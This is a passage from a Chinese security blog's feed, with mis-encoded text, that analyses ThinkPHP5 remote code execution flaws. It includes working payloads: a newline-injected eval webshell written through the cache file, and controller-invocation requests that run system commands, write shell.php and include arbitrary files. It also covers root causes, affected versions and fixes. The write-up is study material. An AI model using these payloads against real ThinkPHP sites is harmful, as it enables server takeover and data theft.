·ç®€å•ã€‚</p><blockquote><p>å…¶å®å¾ˆå¤šäº‹æƒ…ï¼Œæˆ–è®¸éƒ½ç®€å•ï¼Œåªæ˜¯åœ¨äºè‡ªå·±æ„¿ä¸æ„¿æ„å»åšã€‚</p></blockquote><p>æœ€è¿‘ä¹Ÿæ˜¯å¿ƒç¥ä¸å®šçš„ï¼Œå¥½å¥½å­¦ä¹ å˜›ï¼Docker é€ƒé€¸å¥½å‡ ç§æ–¹æ³•éƒ½æ²¡å¤ç°æˆåŠŸï¼Œæ·¦ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¹‹å‰æ¿€æ´»MacBook Proçš„æ—¶å€™ï¼Œæœ¬æ¥æ‰“ç®—æ‹¿å›å®¶æ¿€æ´»çš„ï¼Œä½†æ˜¯å¤ªå¤é‡ŒAppleçš„äººå‘˜å¤ªçƒ­æƒ…å•¦ï¼Œæˆ‘å°±åœ¨å°å§å§å“ªé‡Œæ¿€æ´»äº†ï¼Œä¸€é¡¿ä¸‹ä¸€æ­¥ï¼Œå¯¼è‡´äº†æˆ‘çš„ç”¨æˆ·åæ˜¯æˆ‘çš„çœŸåã€‚æœ‰æ—¶å€™å†™ç¬”è®°ã€æ–‡ç« å•¥çš„ï¼Œæ€»æ„Ÿè§‰ä¸èˆ’æœã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr</summary>
      
    
    
    
    
    <category term="æ‚ç¢" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5æ¼æ´å­¦ä¹ -RCE</title>
    <link href="https://hack-for.fun/a45.html"/>
    <id>https://hack-for.fun/a45.html</id>
    <published>2020-09-23T03:04:09.000Z</published>
    <updated>2020-09-27T13:39:21.764Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸»è¦å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p><h1 id="RCE1-åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE"><a href="#RCE1-åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE" class="headerlink" title="RCE1(åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE)"></a>RCE1(åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE)</h1><p>ç›¸å…³å‚è€ƒèµ„æ–™ï¼š<a href="https://www.cnblogs.com/zpchcbd/p/12546340.html">https://www.cnblogs.com/zpchcbd/p/12546340.html</a></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;thinkphp5:8888&#x2F;public&#x2F;?username&#x3D;test%0d%0a@eval($_GET[_]);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172609.png" alt="image-20200923114608784"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172619.png" alt="image-20200923124814752"></p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><blockquote><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> çš„ç¼“å­˜ç±»ä¸­ã€‚è¯¥ç±»ä¼šå°†ç¼“å­˜æ•°æ®é€šè¿‡åºåˆ—åŒ–çš„æ–¹å¼ï¼Œç›´æ¥å­˜å‚¨åœ¨ <code>.php</code> æ–‡ä»¶ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡ç²¾å¿ƒæ„é€ çš„ <strong>payload</strong> ï¼Œå³å¯å°† <strong>webshell</strong> å†™å…¥ç¼“å­˜æ–‡ä»¶ã€‚ç¼“å­˜æ–‡ä»¶çš„åå­—å’Œç›®å½•å‡å¯é¢„æµ‹å‡ºæ¥ï¼Œä¸€æ—¦ç¼“å­˜ç›®å½•å¯è®¿é—®æˆ–ç»“åˆä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå³å¯è§¦å‘ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> ã€‚</p></blockquote><p>æ¼æ´åˆ©ç”¨å‰æï¼š</p><ul><li><p>ç«™ç‚¹èƒ½å¤Ÿå°†ç¼“å­˜æ–‡ä»¶åˆ—å‡ºï¼Œå¹¶ä¸”ç”¨æˆ·å¯ä»¥å¾—åˆ°è·¯å¾„</p></li><li><p>1ã€ç¼“å­˜ä½¿ç”¨æ–‡ä»¶æ–¹å¼å¹¶ä¸”ç¼“å­˜ç›®å½•æš´éœ²åœ¨webç›®å½•ä¸‹é¢<br>2ã€æ”»å‡»è€…è¦èƒ½çŒœåˆ°å¼€å‘è€…ä½¿ç”¨çš„ç¼“å­˜key</p></li><li><p>çŸ¥é“ç¼“å­˜ç±»æ‰€è®¾ç½®çš„é”®åï¼Œè¿™æ ·æ‰èƒ½æ‰¾åˆ° <strong>webshell</strong> è·¯å¾„ï¼›å…¶æ¬¡å¦‚æœæŒ‰ç…§å®˜æ–¹è¯´æ˜å¼€å‘ç¨‹åºï¼Œ <strong>webshell</strong> æœ€ç»ˆä¼šè¢«å†™åˆ° <strong>runtime</strong> ç›®å½•ä¸‹ï¼Œè€Œå®˜æ–¹æ¨è <strong>public</strong> ä½œä¸º <strong>web</strong> æ ¹ç›®å½•ï¼Œæ‰€ä»¥å³ä¾¿æˆ‘ä»¬å†™å…¥äº† <strong>shell</strong> ï¼Œä¹Ÿæ— æ³•ç›´æ¥è®¿é—®åˆ°ï¼›æœ€åå¦‚æœç¨‹åºæœ‰è®¾ç½® <strong>$this-&gt;options[â€˜prefixâ€™]</strong> çš„è¯ï¼Œåœ¨æ²¡æœ‰æºç çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ— æ³•è·å¾— <strong>webshell</strong> çš„å‡†ç¡®è·¯å¾„ã€‚</p></li><li><blockquote><p>5.0çš„éƒ¨ç½²å»ºè®®æ˜¯publicç›®å½•ä½œä¸ºwebç›®å½•è®¿é—®å†…å®¹ï¼Œå…¶å®ƒéƒ½æ˜¯webç›®å½•ä¹‹å¤–ï¼Œå½“ç„¶ï¼Œä½ å¿…é¡»è¦ä¿®æ”¹public/index.phpä¸­çš„ç›¸å…³è·¯å¾„</p></blockquote></li></ul><p>æ¯”å¦‚è¿™é‡Œä¿®æ”¹çš„index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Cache::set(<span class="string">&quot;name&quot;</span>,input(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</strong></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨ThinkPHP çš„5.0.11 release ä¿¡æ¯ä¸­ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172420.png" alt="image-20200923125619050"></p><p>æ›´æ–°äº†å®Œå–„ç¼“å­˜é©±åŠ¨(å®‰å…¨æ›´æ–°)ã€‚å†å»æŸ¥çœ‹commitè®°å½•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><p>ä¿®å¤æ–¹å¼ä¸ºå°†ç¼“å­˜æ–‡ä»¶çš„å†…å®¹æ‹¼æ¥åˆ°<code>&lt;?php ?&gt;</code> æ ‡ç­¾ä¹‹å¤–ï¼Œå¹¶ä¸”ä½¿ç”¨äº†<code>exit()</code>å‡½æ•°æ¥é€€å‡ºå½“å‰è„šæœ¬ã€‚</p><p>å¯ä¸‹æ–­ç‚¹è¿›è¡Œå•æ­¥è°ƒè¯•ï¼Œè§‚å¯Ÿæ•´ä¸ªå‚æ•°åœ¨Cacheç±»ä»¥åŠRequestç±»ä¸‹è¿›è¿‡ç›¸å…³æ–¹æ³•çš„è¿‡æ»¤ï¼Œè½¬æ¢ï¼Œå¹¶æœ€ç»ˆå†™å…¥äº†ç¼“å­˜æ–‡ä»¶çš„è¿‡ç¨‹ã€‚</p><p>é¦–å…ˆæ˜¯<code>Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));</code> æœªå®ä¾‹åŒ–ï¼Œæ‰€ä»¥ä¸ºè°ƒç”¨<code>autoload</code>æ–¹æ³•ï¼Œè‡ªåŠ¨åŠ è½½æœºåˆ¶æ¥è¿›è¡Œä¸€ç³»åˆ—å®ä¾‹åŒ–æ“ä½œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172411.png" alt="image-20200923161825336"></p><p>ç„¶ååˆ°helper.php ä¸­çš„ <code>input</code>æ–¹æ³•ï¼Œåˆ¤æ–­è¯·æ±‚çš„æ–¹æ³•å’Œè¯·æ±‚çš„å‚æ•°ï¼Œæ­¤å¤„ä¸º<code>get.username</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172318.png" alt="image-20200923162505424"></p><p>ç„¶åè¿”å›è¿‡æ»¤åçš„å€¼ï¼Œç»§ç»­è°ƒç”¨<code>Request</code> ç±»çš„ <code>get</code> æ–¹æ³•å’Œ <code>Input</code> æ–¹æ³•ï¼ˆåœ¨TP5)ä¸­å‚æ•°çš„å¤„ç†éƒ½æ˜¯è¿™æ ·çš„äº†ï¼Œ</p><p>ç»è¿‡<code>filterVaule</code>å’Œ<code>filterExp</code>å‡½æ•°è¿›è¡Œç‰¹æ®Šå­—ç¬¦è¿‡æ»¤å’Œç›¸å…³åˆ¤æ®µåè¿”å›ç»™<code>$data</code></p><hr><p>ç„¶åæ¥åˆ°Cache ç±»çš„<code>set</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172308.png" alt="image-20200923164241136"></p><p>è°ƒç”¨äº†Cache ç±»çš„init æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº† Configé‡Œçš„getæ–¹æ³•ï¼Œè¿™äº›æ“ä½œæ˜¯åœ¨ä¸ºç¼“å­˜å†…å®¹åšä¸€äº›åˆå§‹åŒ–æ“ä½œã€‚ç„¶åå†åˆ°Cache ç±»çš„ connect æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172114.png" alt="image-20200923164824257"></p><p>ä¸ºç¼“å­˜æ–‡ä»¶çš„æ–‡ä»¶åè¿›è¡Œmd5è¿”å›ã€‚è¿™é‡Œçš„<code>self::handler</code>ä¸º<code>think\cache\driver\File</code>ç±»ã€‚æ‰€ä»¥ä¼šè°ƒç”¨<code>File</code>ç±»çš„<code>set</code>æ–¹æ³•ã€‚è¯¥æ–¹æ³•è°ƒç”¨äº†<code>getCacheKey</code>æ–¹æ³•æ¥è·å–ç¼“å­˜æ–‡ä»¶çš„æ–‡ä»¶åã€‚æ–‡ä»¶åçš„æœºåˆ¶å¦‚ä¸‹å›¾ï¼Œå…ˆæ˜¯å¯¹<code>$name</code> md5ï¼Œç„¶åæˆªå–å‰ä¸¤ä½ä½œä¸ºç›®å½•åï¼Œåé¢éƒ¨åˆ†ä½œä¸ºæ–‡ä»¶åç„¶åå’Œ<code>.php</code>åç¼€è¿›è¡Œæ‹¼æ¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172102.png" alt="image-20200923165836437"></p><p>çœ‹çœ‹setæ–¹æ³•çš„å¤„ç†æµç¨‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172037.png" alt="image-20200923170741256"></p><p>æœ€åé€šè¿‡<code>file_put_contents</code>å‡½æ•°ï¼Œå°†<code>$data</code>ï¼ˆå‚æ•°å†…å®¹å¯æ§ï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹dataå‚æ•°è¿›è¡Œä»»ä½•è¿‡æ»¤ç­‰æ“ä½œï¼Œåªæ˜¯åºåˆ—åŒ–åæ‹¼æ¥å­˜å‚¨åœ¨æ–‡ä»¶ä¸­ï¼Œè¿™é‡Œçš„ <strong>$this-&gt;options[â€˜data_compressâ€™]</strong> å˜é‡é»˜è®¤æƒ…å†µä¸‹ä¸º <strong>false</strong> ï¼Œæ‰€ä»¥æ•°æ®ä¸ä¼šç»è¿‡ <strong>gzcompress</strong> å‡½æ•°å¤„ç†ã€‚è™½ç„¶åœ¨åºåˆ—åŒ–æ•°æ®å‰é¢æ‹¼æ¥äº†å•è¡Œæ³¨é‡Šç¬¦ <strong>//</strong> ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å…¥æ¢è¡Œç¬¦ç»•è¿‡è¯¥é™åˆ¶ã€‚ï¼‰ å†™å…¥<code>$filename</code>ä»è€ŒGetShellã€‚</p><blockquote><p>æœ€åå¦‚æœç¨‹åºæœ‰è®¾ç½® <strong>$this-&gt;options[â€˜prefixâ€™]</strong> çš„è¯(ä¹Ÿå°±æ˜¯ä¸Šä¸Šå›¾ä¸­çš„è®¾ç½®æ–‡ä»¶åå‰ç¼€çš„ä»£ç )ï¼Œåœ¨æ²¡æœ‰æºç çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ— æ³•è·å¾— <strong>webshell</strong> çš„å‡†ç¡®è·¯å¾„ã€‚</p></blockquote><h2 id="åˆ©ç”¨æ€»ç»“"><a href="#åˆ©ç”¨æ€»ç»“" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923173430.png"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>1ï¼Œthinkphp3.2çš„ç‰ˆæœ¬è¯·é€‰æ‹©å¼€å¯ï¼šDATA_CACHE_KEY è¿™æ ·å°±ç®—ä½ ä½¿ç”¨çš„cmsæ˜¯å¼€æºçš„äººå®¶å‘ç°äº†è¿™ä¸ªä¹Ÿæ— æ³•ä½¿ç”¨ã€‚<br>2ï¼Œtp3.2-tp5  åšå¥½ç›®å½•æƒé™ï¼Œé™¤å…¬å…±ç›®å½•ç»å¯¹ä¸è¦è®©å¤–éƒ¨å¯è®¿é—®</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><h1 id="RCE2-åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE"><a href="#RCE2-åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE" class="headerlink" title="RCE2(åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE)"></a>RCE2(åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE)</h1><blockquote><p>æ§åˆ¶å™¨è¿‡æ»¤ä¸ä¸¥ï¼Œç»“åˆç›´æ¥è¿”å›ç±»åçš„ä»£ç æ“ä½œï¼Œå¯¼è‡´å¯ä»¥ç”¨å‘½åç©ºé—´çš„æ–¹å¼æ¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•</p></blockquote><p>è·å–å¤ç°ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1.0 tpdemo</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹composer.json çš„  require å­—æ®µã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.30&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>composer update</p><p>ç›¸å…³å‚è€ƒèµ„æ–™ï¼š</p><p><strong>æ„Ÿè§‰è‡ªå·±åˆ†æçš„ä¸å¥½ï¼Œè¦å­¦ä¹ è¿˜æ˜¯å»çœ‹å‚è€ƒèµ„æ–™å§ã€‚</strong></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/</a></p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p><strong>5.1.x</strong> ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p><strong>5.0.x</strong> ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # è·å–é…ç½®ä¿¡æ¯</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # åŒ…å«ä»»æ„æ–‡ä»¶</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # åŒ…å«ä»»æ„.phpæ–‡ä»¶</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä»¥ä»¥è¿™ä¸ªPOCè¿›è¡Œåˆ†æï¼ŒThinkPHP ç‰ˆæœ¬ä¸º<code>5.1.30</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure><p>![image-20200923201833962](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923201833962.png)</p><h2 id="æ¼æ´æ¦‚è¿°-1"><a href="#æ¼æ´æ¦‚è¿°-1" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><blockquote><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> åº•å±‚æ²¡æœ‰å¯¹æ§åˆ¶å™¨åè¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´åœ¨æœªå¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> çš„äº§ç”Ÿã€‚</p></blockquote><h2 id="å½±å“ç‰ˆæœ¬-1"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.7&lt;=ThinkPHP5&lt;=5.0.22</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><p>ä¸åŒç‰ˆæœ¬çš„Payloadï¼Œéœ€è¦åšç›¸å…³çš„è°ƒæ•´ã€‚</p><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨5.1.31çš„æ›´æ–°ä¸­ï¼ŒæŸ¥çœ‹ç›¸å…³æ›´æ–°çš„ä¿¡æ¯ï¼Œå…¶ä¸­å…³äº<code>ä¿®æ­£æ§åˆ¶å™¨åè·å–</code> çš„commit</p><p>![image-20200923221710652](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923221710652.png)</p><p>å¦å¤–ï¼Œå®˜æ–¹å¯¹äºæ­¤å¤„æ›´æ–°ï¼Œä¸“é—¨å‘äº†ä¸€æ¬¡å¾®ä¿¡å…¬å‘Šã€‚<a href="https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A">https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A</a></p><p>å†…å®¹å¦‚ä¸‹ï¼š</p><blockquote><p>æœ¬æ¬¡ç‰ˆæœ¬æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„<code>getshell</code>æ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬<code>5.0</code>å’Œ<code>5.1</code>ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚å¦‚æœæš‚æ—¶æ— æ³•æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œè¯·å¼€å¯å¼ºåˆ¶è·¯ç”±ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150733.png" alt="image-20200923225433768"></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒThinkPHP ä¸å¼€å¯å¼ºåˆ¶è·¯ç”±ï¼Œå¹¶ä¸”å¼€å¯äº†è·¯ç”±å™¨å…¼å®¹æ¨¡å¼ï¼Œ<code>s</code>ã€‚</p><p>5.1.31 ä¿®å¤åœ°å€ï¼š<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><p>ä¸¤ä¸ªå…³é”®ç‚¹ï¼š</p><ul><li>æ§åˆ¶å™¨å</li><li>å¼ºåˆ¶è·¯ç”±</li></ul><p>by ä¸ƒæœˆç«å¸ˆå‚…ï¼š</p><blockquote><p>åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±ï¼Œè¯´æ˜æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è·¯ç”±å…¼å®¹æ¨¡å¼ <strong>s</strong> å‚æ•°ï¼Œè€Œæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ï¼Œè¯´æ˜å¯èƒ½å¯ä»¥è°ƒç”¨ä»»æ„çš„æ§åˆ¶å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¯•ç€åˆ©ç”¨ <code>http://site/?s=æ¨¡å—/æ§åˆ¶å™¨/æ–¹æ³•</code> æ¥æµ‹è¯•ä¸€ä¸‹ã€‚åœ¨å…ˆå‰çš„ <strong>ThinkPHP SQLæ³¨å…¥</strong> åˆ†ææ–‡ç« ä¸­ï¼Œæˆ‘ä»¬éƒ½æœ‰æåˆ°æ‰€æœ‰ç”¨æˆ·å‚æ•°éƒ½ä¼šç»è¿‡ <strong>Request</strong> ç±»çš„ <strong>input</strong> æ–¹æ³•å¤„ç†ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨ <strong>filterValue</strong> æ–¹æ³•ï¼Œè€Œ <strong>filterValue</strong> æ–¹æ³•ä¸­ä½¿ç”¨äº† <strong>call_user_func</strong> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ¥å°è¯•åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ã€‚</p></blockquote><p><a href="https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select">https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p><code>call_user_func($filter,$value);</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150312.png" alt="image-20200923230344961"></p><p>å¯ä»¥çœ‹åˆ°ç³»ç»Ÿå‘½ä»¤æˆåŠŸæ‰§è¡Œã€‚</p><p>æ ¹æ®ä¿®å¤çš„å†…å®¹ï¼šå¯¹æ§åˆ¶å™¨åçš„è·å–ï¼Œç›´æ¥åœ¨è·å–æ§åˆ¶å™¨çš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼Œæ¥è¿›è¡Œè°ƒè¯•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150235.png" alt="image-20200923231658510"></p><p>å¾—å‡ºï¼šæ§åˆ¶å™¨åæ˜¯é€šè¿‡<code>$result[1]</code> æ¥è·å–çš„ã€‚</p><blockquote><p>è€Œ <strong>$result</strong> çš„å€¼æ¥æºäºå…¼å®¹æ¨¡å¼ä¸‹çš„ <strong>pathinfo</strong> ï¼Œå³ <strong>s</strong> å‚æ•°</p></blockquote><p>ç»§ç»­è¿›è¡Œå•æ­¥è°ƒè¯•ï¼Œç¨‹åºä¼šæ¥åˆ°Appç±»ä¸‹çš„<code>run</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150152.png" alt="image-20200924094001917"></p><p>ç»§ç»­è°ƒç”¨<code>Dispatch</code>ç±»çš„<code>run</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è°ƒç”¨äº†<code>exec</code> æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 